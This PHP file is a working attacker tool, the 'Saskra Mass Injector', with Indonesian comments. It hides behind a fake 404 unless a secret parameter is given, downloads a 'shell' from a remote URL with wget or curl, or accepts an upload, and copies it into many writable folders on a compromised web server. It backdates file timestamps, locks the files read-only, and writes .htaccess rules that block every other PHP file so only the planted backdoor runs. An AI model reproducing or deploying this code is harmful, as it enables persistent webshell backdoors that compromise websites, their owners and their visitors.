<?php
/**
 * 🔐 Saskra Ultimate Injector - Mass .htaccess Edition
 * Akses: file_kamu.php?Saskra
 * Fitur: Upload, Remote Fetch, dan MASS .HTACCESS PATCHER (Fix Chmod)
 */

// 1. Set Timezone (WIB)
date_default_timezone_set('Asia/Jakarta');

if (!isset($_GET['Saskra'])) {
    header('HTTP/1.1 404 Not Found');
    exit;
}

@clearstatcache();
@ini_set('memory_limit', '512M');
@set_time_limit(0); 

@ob_implicit_flush(true);
while (@ob_get_level()) @ob_end_clean();

$successLog = [];
$errorLog = [];
$showResults = false;
$processedCount = 0;

// --- FUNGSI FETCH ---
function fetchRemoteFile($url, $method) {
    $tempFile = tempnam(sys_get_temp_dir(), 'inj');
    if ($method === 'wget') {
        @exec("wget $url -O $tempFile");
    } elseif ($method === 'curl') {
        @exec("curl -L $url -o $tempFile");
    } elseif ($method === 'auto') {
        $content = @file_get_contents($url);
        if ($content) file_put_contents($tempFile, $content);
        if (filesize($tempFile) == 0 && function_exists('curl_init')) {
            $ch = curl_init($url);
            $fp = fopen($tempFile, 'wb');
            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            curl_close($ch);
            fclose($fp);
        }
    }
    if (file_exists($tempFile) && filesize($tempFile) > 0) return $tempFile;
    return false;
}

// --- FUNGSI SCAN BIASA ---
function getTargetFolders($dir, $depth = 0) {
    $dirs = [];
    if ($depth > 4) return $dirs; 
    $items = @scandir($dir);
    if ($items === false) return $dirs;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && is_writable($path)) {
            $dirs[] = $path;
            $dirs = array_merge($dirs, getTargetFolders($path, $depth + 1));
        }
        if (count($dirs) > 250) break;
    }
    return $dirs;
}

// --- FUNGSI MASS HTACCESS & CHMOD (RECURSIVE) ---
function massHtaccessProcess($dir, $htaccessContent, $phpSource, $phpName, $mtime) {
    global $successLog, $errorLog, $processedCount;
    
    // 1. Fix CHMOD Folder saat ini (0755)
    @chmod($dir, 0755);
    
    // 2. Scan isi folder
    $items = @scandir($dir);
    if ($items === false) return;

    // 3. Tulis .htaccess di folder ini
    $destHt = $dir . DIRECTORY_SEPARATOR . '.htaccess';
    if (@file_put_contents($destHt, $htaccessContent)) {
        @touch($destHt, $mtime);
        @chmod($destHt, 0444); // Lock .htaccess
    }

    // 4. (Opsional) Tulis File PHP jika ada
    if (!empty($phpSource) && !empty($phpName)) {
        $destPhp = $dir . DIRECTORY_SEPARATOR . $phpName;
        if (@copy($phpSource, $destPhp)) {
            @touch($destPhp, $mtime);
            @chmod($destPhp, 0444);
            $processedCount++;
            // Agar log tidak penuh saat mass, kita tidak log per file, tapi nanti total saja
        }
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($path)) {
            // RECURSIVE KE FOLDER DALAM
            massHtaccessProcess($path, $htaccessContent, $phpSource, $phpName, $mtime);
        } else {
            // JIKA FILE -> CHMOD 0644
            @chmod($path, 0644);
        }
    }
}

// Default .htaccess
$defaultHtaccess = "<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>
<FilesMatch \"^({{FILE}})$\">
    Order allow,deny
    Allow from all
</FilesMatch>
<FilesMatch \"\\\\.(ph.*|a.*|P[hH].*|S.*)$\"> 
    Require all denied 
</FilesMatch>
 
<FilesMatch \"^({{FILE}})$\">
    Require all granted 
</FilesMatch> 

DirectoryIndex {{FILE}} 
Options -Indexes 
 
ErrorDocument 403 \"<meta http-equiv='refresh' content='0;url=/'>\"
ErrorDocument 404 \"<meta http-equiv='refresh' content='0;url=/'>\"";

function getVal($key, $default) {
    return isset($_POST[$key]) ? htmlspecialchars($_POST[$key]) : $default;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetPath = rtrim($_POST['target_path'], DIRECTORY_SEPARATOR);
    $limit = (int)($_POST['folder_limit'] ?? 5);
    
    $method = $_POST['method'] ?? 'upload';
    // Jika Mass Htaccess dipilih, paksa mode jadi direct
    if ($method === 'mass_htaccess') {
        $targetMode = 'direct';
    } else {
        $targetMode = $_POST['target_mode'] ?? 'new_folder';
    }
    
    $isRemote = ($method === 'curl' || $method === 'wget' || $method === 'auto');
    $isMass   = ($method === 'mass_htaccess');
    $isDirect = ($targetMode === 'direct');

    $timeInput = $_POST['set_time'] ?? date('Y-m-d H:i:s');
    $mtime = strtotime($timeInput);
    if (!$mtime) $mtime = time(); 
    
    $customFolders = explode(',', $_POST['custom_folders']);
    $customFolders = array_map('trim', $customFolders);
    $customFolders = array_filter($customFolders);
    
    $fileChmod = octdec($_POST['file_chmod'] ?? '0644');
    $folderChmod = octdec($_POST['folder_chmod'] ?? '0755');

    $customFileName = trim($_POST['custom_php_name']);
    if (empty($customFileName)) $customFileName = 'index.php';
    if (stripos($customFileName, '.php') === false) $customFileName .= '.php';

    // REPLACE {{FILE}} DI HTACCESS
    $rawHtaccess = $_POST['htaccess_source'] ?? '';
    $finalHtaccessContent = str_replace('{{FILE}}', $customFileName, $rawHtaccess);

    // SIAPKAN SOURCE FILE (JIKA ADA)
    $sourceFile = '';
    if ($isRemote) {
        $remoteUrl = $_POST['php_url'] ?? '';
        if (filter_var($remoteUrl, FILTER_VALIDATE_URL)) {
            $sourceFile = fetchRemoteFile($remoteUrl, $method);
            if (!$sourceFile) $errorLog[] = "❌ Gagal Fetch URL.";
        }
    } else {
        // Upload / Mass Htaccess (Local Upload PHP Optional)
        if (isset($_FILES['php_file']) && $_FILES['php_file']['error'] == 0) {
            $sourceFile = $_FILES['php_file']['tmp_name'];
            if (empty($customFileName)) $customFileName = basename($_FILES['php_file']['name']); 
        }
    }

    if (is_dir($targetPath)) {
        
        // --- LOGIC MASS HTACCESS ---
        if ($isMass) {
            $successLog[] = "🔄 <b>STARTING MASS .HTACCESS & CHMOD FIX...</b>";
            $successLog[] = "📂 Target: $targetPath (Recursive)";
            $successLog[] = "🔧 Action: Chmod Dir 0755, File 0644, Deploy .htaccess";
            
            // Jalankan Recursive
            massHtaccessProcess($targetPath, $finalHtaccessContent, $sourceFile, $customFileName, $mtime);
            
            $successLog[] = "✅ <b>MASS PROCESS COMPLETED.</b>";
            if (!empty($sourceFile)) {
                $successLog[] = "🚀 PHP File ($customFileName) also injected to all folders.";
            } else {
                $successLog[] = "ℹ️ No PHP file uploaded (Only .htaccess & chmod applied).";
            }
            $showResults = true;

        } else {
            // --- LOGIC INJECT BIASA (NON-MASS) ---
            if (!empty($sourceFile) && file_exists($sourceFile)) {
                $allPossibleDirs = getTargetFolders($targetPath);
                
                if (empty($allPossibleDirs)) {
                    $errorLog[] = "❌ Tidak ada folder writable.";
                } else {
                    shuffle($allPossibleDirs);
                    $selectedDirs = array_slice($allPossibleDirs, 0, $limit);

                    foreach ($selectedDirs as $dir) {
                        if ($isDirect) {
                            $finalPath = $dir;
                            @chmod($finalPath, 0755); 
                        } else {
                            shuffle($customFolders);
                            $newFolderName = $customFolders[0]; 
                            $finalPath = $dir . DIRECTORY_SEPARATOR . $newFolderName;
                            if (!is_dir($finalPath)) @mkdir($finalPath, 0755, true);
                            else @chmod($finalPath, 0755); 
                        }

                        $destPhp = $finalPath . DIRECTORY_SEPARATOR . $customFileName;
                        $destHt  = $finalPath . DIRECTORY_SEPARATOR . '.htaccess';

                        if (!empty($finalHtaccessContent)) {
                            if (@file_put_contents($destHt, $finalHtaccessContent)) {
                                @touch($destHt, $mtime);
                                @chmod($destHt, $fileChmod); 
                            }
                        }

                        if (@copy($sourceFile, $destPhp)) {
                            @touch($destPhp, $mtime);
                            @chmod($destPhp, $fileChmod); 
                            @touch($finalPath, $mtime);
                            @chmod($finalPath, $folderChmod); 
                            
                            $time = date('H:i:s');
                            $mLabel = strtoupper($method); 
                            $tLabel = $isDirect ? "DIRECT" : "NEW DIR";
                            $cColor = $isDirect ? "#d67f2c" : "#44d62c";
                            $successLog[] = "<span style='color:#666'>[$time]</span> 🚀 [$mLabel] <span style='color:$cColor; font-weight:bold;'>$tLabel</span> : <code>$destPhp</code>";
                            $processedCount++;
                        } else {
                             $errorLog[] = "❌ Gagal: $destPhp";
                        }
                    }
                }
            } else {
                // Error kalau bukan mass tapi ga ada file
                 $errorLog[] = "❌ Harap upload file PHP atau masukkan URL (kecuali mode Mass .htaccess bisa tanpa PHP).";
            }
            $showResults = true;
        }
    }
    
    if ($isRemote && !empty($sourceFile) && file_exists($sourceFile)) {
        @unlink($sourceFile);
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>Saskra Mass Injector</title>
    <style>
        body { background: #0b0e14; color: #e0e6ed; font-family: 'Segoe UI', sans-serif; padding: 20px; font-size: 14px; margin:0; }
        .box { max-width: 800px; margin: auto; background: #151921; border: 1px solid #333; padding: 25px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        h2 { text-align: center; color: #44d62c; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 1px; font-size: 1.5rem; }
        label { display: block; margin: 15px 0 5px; color: #8b949e; font-weight: 600; font-size: 0.85rem; text-transform: uppercase; }
        input, textarea, select { 
            width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; 
            color: #c9d1d9; border-radius: 6px; box-sizing: border-box; outline: none; transition: 0.2s;
            font-family: monospace; font-size: 13px;
        }
        input:focus, textarea:focus, select:focus { border-color: #44d62c; }
        textarea { height: 120px; color: #a5d6ff; }
        .row { display: flex; gap: 15px; flex-wrap: wrap; } 
        .col { flex: 1; min-width: 250px; } 
        .select-styled { cursor: pointer; border: 1px solid #44d62c; color: #fff; font-weight: bold; }
        .input-area { margin-top: 15px; padding: 15px; background: #11141a; border-radius: 6px; border: 1px dashed #444; }
        .hidden { display: none; }
        button { 
            width: 100%; padding: 14px; margin-top: 25px; background: #44d62c; border: none; 
            color: #0b0e14; font-weight: bold; font-size: 1rem; cursor: pointer; 
            border-radius: 6px; transition: 0.3s; text-transform: uppercase;
        }
        button:hover { background: #3cb825; transform: scale(1.01); }
        .log { margin-top: 25px; background: #0d1117; padding: 15px; font-size: 12px; border: 1px solid #30363d; height: 250px; overflow-y: auto; color: #c9d1d9; border-radius: 6px; }
        .info { color: #8b949e; font-size: 11px; margin-top: 5px; font-style: italic; }
        @media (max-width: 600px) { body { padding: 10px; } .box { padding: 15px; } .col { min-width: 100%; } }
    </style>
</head>
<body>
    <div class="box">
        <h2>⚡ Saskra Mass Injector</h2>
        <form method="POST" enctype="multipart/form-data">
            
            <div class="row">
                <div class="col">
                    <label>1. Select Source (Method)</label>
                    <select name="method" id="methodSelect" class="select-styled" onchange="toggleInputs()">
                        <option value="upload" <?= (getVal('method', 'upload') == 'upload') ? 'selected' : '' ?>>📂 Upload Local File</option>
                        <option value="curl" <?= (getVal('method', '') == 'curl') ? 'selected' : '' ?>>🌊 Fetch via Curl (Exec)</option>
                        <option value="wget" <?= (getVal('method', '') == 'wget') ? 'selected' : '' ?>>📥 Fetch via Wget (Exec)</option>
                        <option value="auto" <?= (getVal('method', '') == 'auto') ? 'selected' : '' ?>>✨ Auto Fetch (Best Available)</option>
                        <option value="mass_htaccess" <?= (getVal('method', '') == 'mass_htaccess') ? 'selected' : '' ?> style="background: #442c2c; color: #ff9999;">🛡️ Mass .htaccess & Chmod Fix</option>
                    </select>
                </div>
                <div class="col">
                    <label>2. Select Target (Mode)</label>
                    <select name="target_mode" id="targetModeSelect" class="select-styled" style="border-color: #d67f2c;">
                        <option value="new_folder" <?= (getVal('target_mode', 'new_folder') == 'new_folder') ? 'selected' : '' ?>>🛡️ Create New Subfolder [Safe]</option>
                        <option value="direct" <?= (getVal('target_mode', '') == 'direct') ? 'selected' : '' ?>>⚠️ Direct Root Folder [Risk]</option>
                    </select>
                    <div id="massInfo" class="info hidden" style="color: #ff9999;">*Mode MASS aktif: Target otomatis 'Direct' ke semua folder.</div>
                </div>
            </div>

            <div class="input-area">
                <div id="input_upload" class="">
                    <label style="margin-top:0; color:#44d62c;">Select PHP File (Optional for Mass .htaccess):</label>
                    <input type="file" name="php_file">
                    <div class="info">*Jika Mass Htaccess dipilih, file PHP ini juga akan di-copy ke semua folder (Mass Backdoor). Kosongkan jika hanya ingin fix .htaccess.</div>
                </div>
                <div id="input_remote" class="hidden">
                    <label style="margin-top:0; color:#2c97d6;">Paste Shell URL (Raw Link):</label>
                    <input type="url" name="php_url" value="<?= getVal('php_url', '') ?>" placeholder="http://site.com/shell.txt">
                </div>
            </div>

            <div class="row" style="margin-top:15px;">
                <div class="col">
                    <label>Rename PHP To:</label>
                    <input type="text" id="phpNameInput" name="custom_php_name" value="<?= getVal('custom_php_name', 'index.php') ?>" onkeyup="updateHtaccessPreview()">
                    <div class="info">*Ketik nama file, .htaccess dibawah akan otomatis berubah.</div>
                </div>
                <div class="col">
                    <label>Limit Folders (Ignored in Mass Mode):</label>
                    <input type="number" name="folder_limit" value="<?= getVal('folder_limit', '10') ?>">
                </div>
            </div>

            <details style="margin-top:15px; background: #11141a; padding: 10px; border-radius: 6px; cursor: pointer;" open>
                <summary style="color: #8b949e; font-weight: bold; font-size: 12px;">⚙️ CONFIGURATION & HTACCESS</summary>
                
                <div style="margin-top:10px;">
                    <label>Path Target:</label>
                    <input type="text" name="target_path" value="<?= getVal('target_path', getcwd()) ?>">

                    <div class="row">
                        <div class="col"><label>File CHMOD (Mass: 0644):</label><input type="text" name="file_chmod" value="<?= getVal('file_chmod', '0444') ?>"></div>
                        <div class="col"><label>Folder CHMOD (Mass: 0755):</label><input type="text" name="folder_chmod" value="<?= getVal('folder_chmod', '0111') ?>"></div>
                    </div>

                    <label>Timestamp:</label>
                    <input type="text" name="set_time" value="<?= getVal('set_time', '2025-03-07 16:00:46') ?>">
                    
                    <label>Folder Pool (New Folder Mode):</label>
                    <input type="text" name="custom_folders" value="<?= getVal('custom_folders', 'assets, cache, tmp, media, logs, includes, misc, libs, vendor, css, js, images, img, core, config, data, uploads, plugins, themes, modules, dist, src, backup, db, api, public, static') ?>">

                    <label>.htaccess Content (Auto Syncs with PHP Name):</label>
                    <textarea id="htaccessText" name="htaccess_source"><?= getVal('htaccess_source', $defaultHtaccess) ?></textarea>
                </div>
            </details>

            <button type="submit">🚀 Execute Injection</button>
        </form>

        <?php if ($showResults): ?>
            <div class="log">
                <div style="margin-bottom:10px; border-bottom:1px solid #333; padding-bottom:5px; color: #888;">
                    Start Time: <?= date('d-M-Y H:i:s') ?>
                </div>
                <?php foreach($successLog as $msg) echo "<div>$msg</div>"; ?>
                <?php foreach($errorLog as $msg) echo "<div style='color:#ff4444'>$msg</div>"; ?>
                <div style="margin-top:10px; font-weight:bold; border-top: 1px solid #333; padding-top:10px; color: #fff;">
                    Total Injected: <?= $processedCount ?> items.
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        const htaccessTemplate = `<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>
<FilesMatch "^({{FILE}})$">
    Order allow,deny
    Allow from all
</FilesMatch>
<FilesMatch "\\\\.(ph.*|a.*|P[hH].*|S.*)$"> 
    Require all denied 
</FilesMatch>
 
<FilesMatch "^({{FILE}})$">
    Require all granted 
</FilesMatch> 

DirectoryIndex {{FILE}} 
Options -Indexes 
 
ErrorDocument 403 "<meta http-equiv='refresh' content='0;url=/'>"
ErrorDocument 404 "<meta http-equiv='refresh' content='0;url=/'>"`;

        function updateHtaccessPreview() {
            let inputName = document.getElementById('phpNameInput').value.trim();
            if (inputName === '') inputName = 'index.php'; 
            if (!inputName.toLowerCase().endsWith('.php')) {
                inputName += '.php';
            }
            let newContent = htaccessTemplate.replaceAll('{{FILE}}', inputName);
            document.getElementById('htaccessText').value = newContent;
        }

        function toggleInputs() {
            var method = document.getElementById('methodSelect').value;
            var targetSelect = document.getElementById('targetModeSelect');
            var massInfo = document.getElementById('massInfo');
            
            var upDiv = document.getElementById('input_upload');
            var remDiv = document.getElementById('input_remote');

            if (method === 'mass_htaccess') {
                // FORCE DIRECT MODE
                targetSelect.value = 'direct';
                targetSelect.disabled = true; // Kunci biar gak diganti
                massInfo.classList.remove('hidden');
                
                // Mass htaccess pakai upload file (opsional)
                upDiv.classList.remove('hidden');
                remDiv.classList.add('hidden');
            } else {
                // NORMAL MODE
                targetSelect.disabled = false;
                massInfo.classList.add('hidden');

                if (method === 'upload') {
                    upDiv.classList.remove('hidden'); remDiv.classList.add('hidden');
                } else {
                    upDiv.classList.add('hidden'); remDiv.classList.remove('hidden');
                }
            }
        }

        window.onload = function() {
            toggleInputs();
            updateHtaccessPreview();
        };
    </script>
</body>
</html>